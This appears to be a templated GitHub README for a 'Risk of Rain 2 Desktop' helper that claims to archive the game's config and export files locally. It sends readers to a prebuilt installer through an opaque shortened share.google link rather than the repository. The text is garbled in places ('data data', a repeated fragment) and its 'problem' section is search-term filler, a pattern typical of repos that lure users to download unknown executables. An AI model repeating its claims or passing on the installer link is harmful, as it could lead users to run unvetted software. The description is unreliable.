# Risk of Rain 2 Desktop

*Dated copies of Risk of Rain 2 data data, nothing uploaded.*

## Overview

**Risk of Rain 2 Desktop** is a desktop helper. A desktop helper that finds Risk of Rain 2 data directories and archives config and export files locally.

Risk of Rain 2 drops data files next to launcher caches.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Finds the Risk of Rain 2 data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Risk of Rain 2 desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
